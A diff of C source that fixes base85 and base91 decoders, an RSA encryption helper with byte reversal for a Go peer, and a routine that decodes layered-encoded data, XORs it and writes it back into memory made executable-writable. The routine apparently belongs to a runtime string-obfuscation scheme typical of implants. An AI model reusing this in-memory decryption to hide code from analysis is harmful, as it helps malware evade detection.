@@ -162,13 +162,13 @@ unsigned char* base85_decode(const char* data, size_t input_length, size_t* outp
     int n = 0;
 
     for (size_t i = 0; i < input_length; i++) {
-        val = val * 85 + (data[i] - 33);
+        val = val * 85 + (unsigned char)(data[i] - 33);
         n++;
         if (n == 5) {
-            out[count++] = (val >> 24) & 0xFF;
-            out[count++] = (val >> 16) & 0xFF;
-            out[count++] = (val >> 8) & 0xFF;
-            out[count++] = val & 0xFF;
+            out[count++] = (unsigned char)((val >> 24) & 0xFF);
+            out[count++] = (unsigned char)((val >> 16) & 0xFF);
+            out[count++] = (unsigned char)((val >> 8) & 0xFF);
+            out[count++] = (unsigned char)(val & 0xFF);
             val = 0;
             n = 0;
         }
@@ -177,7 +177,7 @@ unsigned char* base85_decode(const char* data, size_t input_length, size_t* outp
     if (n > 0) {
         int m = n - 1;
         for (int i = 0; i < 5 - n; i++) val = val * 85 + 84;
-        for (int i = 0; i < m; i++) out[count++] = (val >> (24 - i * 8)) & 0xFF;
+        for (int i = 0; i < m; i++) out[count++] = (unsigned char)((val >> (24 - i * 8)) & 0xFF);
     }
 
     if (output_length) *output_length = count;
@@ -186,13 +186,17 @@ unsigned char* base85_decode(const char* data, size_t input_length, size_t* outp
 
 unsigned char* base91_decode(const char* data, size_t input_length, size_t* output_length) {
     const char* lookup = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~\"";
-    unsigned char reverse_lookup[256];
-    for (int i = 0; i < 91; i++) reverse_lookup[(unsigned char)lookup[i]] = i;
+    static unsigned char reverse_lookup[256];
+    static int initialized = 0;
+    if (!initialized) {
+        for (int i = 0; i < 91; i++) reverse_lookup[(unsigned char)lookup[i]] = (unsigned char)i;
+        initialized = 1;
+    }
 
     unsigned char* out = (unsigned char*)malloc(input_length);
     if (!out) return NULL;
 
-    unsigned int b = 0;
+    unsigned long long b = 0;
     int n = 0;
     int v = -1;
     size_t count = 0;
@@ -203,10 +207,10 @@ unsigned char* base91_decode(const char* data, size_t input_length, size_t* outp
             v = c;
         } else {
             v += c * 91;
-            b |= v << n;
+            b |= (unsigned long long)v << n;
             n += (v & 8191) > 88 ? 13 : 14;
             do {
-                out[count++] = b & 0xFF;
+                out[count++] = (unsigned char)(b & 0xFF);
                 b >>= 8;
                 n -= 8;
             } while (n > 7);
@@ -214,7 +218,7 @@ unsigned char* base91_decode(const char* data, size_t input_length, size_t* outp
         }
     }
     if (v != -1) {
-        out[count++] = (b | v << n) & 0xFF;
+        out[count++] = (unsigned char)((b | (unsigned long long)v << n) & 0xFF);
     }
 
     if (output_length) *output_length = count;
@@ -351,12 +355,13 @@ char* rsa_encrypt_pkcs1(const unsigned char* data, size_t len, const char* pubke
                         memcpy(encBuf, data, len);
                         DWORD dataLen = (DWORD)len;
                         if (CryptEncrypt(hRSAKey, 0, TRUE, 0, encBuf, &dataLen, encLen)) {
-                            // Reverse output for Big Endian compatibility with Go
+                            // Reverse output for Big Endian compatibility with Go's RSA
                             for (DWORD i = 0; i < dataLen / 2; i++) {
                                 BYTE temp = encBuf[i];
                                 encBuf[i] = encBuf[dataLen - 1 - i];
                                 encBuf[dataLen - 1 - i] = temp;
                             }
+                            // Important: Use the updated dataLen which is the size of the ciphertext
                             out = base64_encode(encBuf, dataLen, NULL);
                         }
                         free(encBuf);
@@ -527,6 +532,7 @@ void transparent_decryption() {
         memcpy(current_data, encoded_data, current_len);
         current_data[current_len] = 0;
 
+        int failed = 0;
         for (int j = 6; j >= 0; j--) {
             unsigned char* next_data = NULL;
             size_t next_len = 0;
@@ -539,13 +545,22 @@ void transparent_decryption() {
                 case 5: next_data = base62_decode((char*)current_data, current_len, &next_len); break;
                 case 6: next_data = base85_decode((char*)current_data, current_len, &next_len); break;
                 case 7: next_data = base91_decode((char*)current_data, current_len, &next_len); break;
+                default: break;
             }
 
             if (next_data) {
                 free(current_data);
                 current_data = next_data;
                 current_len = next_len;
+            } else {
+                failed = 1;
+                break;
             }
+        }
+
+        if (failed) {
+            free(current_data);
+            continue;
         }
 
         // Final XOR
@@ -556,12 +571,14 @@ void transparent_decryption() {
         // Patch back to memory
         MEMORY_BASIC_INFORMATION mbi;
         if (VirtualQuery(addr, &mbi, sizeof(mbi))) {
-            DWORD old_protect;
-            if (VirtualProtect(addr, orig_len, PAGE_EXECUTE_READWRITE, &old_protect)) {
-                memcpy(addr, current_data, (current_len < orig_len) ? current_len : orig_len);
-                // Ensure null termination if there's space
-                if (current_len < orig_len) addr[current_len] = 0;
-                VirtualProtect(addr, orig_len, old_protect, &old_protect);
+            if (mbi.State == MEM_COMMIT && (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE))) {
+                DWORD old_protect;
+                if (VirtualProtect(addr, orig_len, PAGE_EXECUTE_READWRITE, &old_protect)) {
+                    memcpy(addr, current_data, (current_len < orig_len) ? current_len : orig_len);
+                    // Ensure null termination if there's space
+                    if (current_len < orig_len) addr[current_len] = 0;
+                    VirtualProtect(addr, orig_len, old_protect, &old_protect);
+                }
             }
         }
         free(current_data);
